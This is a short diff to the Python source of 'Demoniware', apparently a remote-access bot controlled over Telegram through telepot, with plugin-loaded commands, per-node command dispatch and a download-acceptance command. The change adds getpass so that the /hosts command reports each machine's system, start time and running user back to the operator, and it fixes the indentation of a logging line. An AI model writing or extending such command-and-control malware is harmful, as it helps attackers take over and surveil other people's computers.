@@ -6,7 +6,7 @@ import telepot
 import os
 import sys
 import platform
-
+import getpass
 import logging
 
 from time import sleep, gmtime, strftime
@@ -98,7 +98,7 @@ class Demoniware(object):
                             self.command_routes[command.name] = name
                             new_cmd.append(command.name)
 
-                        self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(name, self.plugins[name].name, self.plugins[name].version, new_cmd))
+                    self.logger.info('[+] Plugin loaded: {} ({} @ {}), new commands: {}'.format(name, self.plugins[name].name, self.plugins[name].version, new_cmd))
                 except Exception as e:
                     self.logger.error('[-] Error loading plugin: {} ({})'.format(name, str(e)))
 
@@ -155,7 +155,7 @@ class Demoniware(object):
         cmd = msg.split()
 
         if '/hosts' in cmd[0]:
-            self.send_message(chat_id, '{} [started at {}]'.format(self.node, self.start_time))
+            self.send_message(chat_id, '{}, started at {}, running as {}'.format(self.system, self.start_time, getpass.getuser()))
 
         elif cmd[0].lower() in self.node.lower() and len(cmd) >= 2:
             if cmd[1] == '/accept_download':
